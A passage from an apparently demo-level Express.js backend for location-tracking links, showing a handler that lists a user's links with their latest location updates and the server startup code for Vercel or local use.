    res.json({ success: true, message: 'Link deactivated successfully' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get all links for a user
app.get('/api/links/user/:userId', (req, res) => {
  try {
    const { userId } = req.params;
    const userLinks = [];
    
    trackingLinks.forEach((linkData, linkId) => {
      if (linkData.userId === userId) {
        const locationCount = locationUpdates.get(linkId)?.length || 0;
        const linkUpdates = locationUpdates.get(linkId) || [];
        userLinks.push({
          ...linkData,
          locationCount: locationCount,
          latestLocation: linkUpdates.length > 0 ? linkUpdates[linkUpdates.length - 1] : null
        });
      }
    });
    
    res.json({
      success: true,
      links: userLinks
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// On Vercel, export app for serverless functions (don't start server)
if (process.env.VERCEL) {
  module.exports = app;
} else {
  // Start server for local development or other platforms
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`API available at http://localhost:${PORT}/api`);
    if (process.env.BACKEND_URL) {
      console.log(`Backend URL: ${process.env.BACKEND_URL}`);
    }
    if (process.env.FRONTEND_URL) {
      console.log(`Frontend URL: ${process.env.FRONTEND_URL}`);
    }
    if (process.env.VERCEL_URL) {
      console.log(`Vercel URL: https://${process.env.VERCEL_URL}`);
    }
  });
}

